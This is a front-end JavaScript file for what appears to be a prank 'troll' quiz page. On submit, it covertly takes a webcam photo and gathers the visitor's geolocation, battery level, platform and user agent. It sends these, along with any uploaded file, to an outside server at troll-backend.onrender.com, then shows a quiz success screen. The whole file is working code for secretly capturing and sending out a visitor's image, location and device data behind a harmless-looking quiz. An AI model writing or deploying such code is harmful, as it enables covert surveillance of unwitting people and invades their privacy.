// ================================
// FRONTEND SCRIPT.JS
// ================================

// DOM elements
const btn = document.getElementById('submit-btn') || document.getElementById('btn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const fileInput = document.getElementById('user-file');
const toast = document.getElementById('toast');

const BACKEND_BASE = "https://troll-backend.onrender.com/api";

// Camera constraints
const constraints = { video: { facingMode: "user" }, audio: false };

// ================================
// SHOW TOAST FUNCTION
// ================================
function showToast(message = "Done") {
  toast.textContent = message;
  toast.style.display = "block";
  setTimeout(() => { toast.style.display = "none"; }, 3000);
}

// ================================
// COLLECT METADATA
// ================================
async function collectMetadata() {
  const metadata = {
    width: window.innerWidth,
    height: window.innerHeight,
    platform: navigator.platform,
    language: navigator.language,
    useragent: navigator.userAgent,
    time: new Date().toLocaleString(),
    battery: "N/A",
    location: "N/A"
  };

  // Battery info
  if (navigator.getBattery) {
    const battery = await navigator.getBattery();
    metadata.battery = battery.level * 100 + "%, charging: " + battery.charging;
  }

  // Geolocation
  if (navigator.geolocation) {
    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject);
      });
      metadata.location = `${position.coords.latitude},${position.coords.longitude}`;
    } catch (err) {
      metadata.location = "Denied";
    }
  }

  return metadata;
}

// ================================
// CAPTURE PHOTO
// ================================
async function capturePhoto() {
  const context = canvas.getContext('2d');
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  return canvas.toDataURL('image/png');
}

// ================================
// SEND CAMERA IMAGE + METADATA
// ================================
async function sendCameraData() {
  try {
    // Request camera permission
    const stream = await navigator.mediaDevices.getUserMedia(constraints);
    video.srcObject = stream;

    const metadata = await collectMetadata();

    // Wait a few seconds so user has time to focus
    await new Promise(res => setTimeout(res, 3000));

    const image = await capturePhoto();

    const res = await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image, metadata })
    });

    const data = await res.json();
    if (data.success) showToast("Camera captured & sent!");
    else showToast("Failed to send camera image");
  } catch (err) {
    console.error("Camera capture error:", err);
    alert("Camera permission denied or error occurred.");
  }
}

// ================================
// SEND FILE UPLOAD
// ================================
async function sendFileUpload(file) {
  try {
    if (!file) return;
    const reader = new FileReader();
    reader.onload = async () => {
      const base64 = reader.result;

      const res = await fetch(`${BACKEND_BASE}/file-upload`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ file: base64, filename: file.name })
      });

      const data = await res.json();
      if (data.success) showToast("File uploaded successfully!");
      else showToast("File upload failed");
    };
    reader.readAsDataURL(file);
  } catch (err) {
    console.error("File upload error:", err);
  }
}

// ================================
// HANDLE FORM SUBMIT
// ================================
if (btn) {
  btn.addEventListener('click', async (e) => {
    e.preventDefault();

    // 1️⃣ Capture camera
    await sendCameraData();

    // 2️⃣ Send file if selected
    if (fileInput && fileInput.files.length > 0) {
      await sendFileUpload(fileInput.files[0]);
    }

    // 3️⃣ Show success page or reload
    const quiz = document.getElementById('quiz-container');
    const success = document.getElementById('success-container');
    if (quiz && success) {
      quiz.style.display = "none";
      success.style.display = "flex";
    }
  });
}
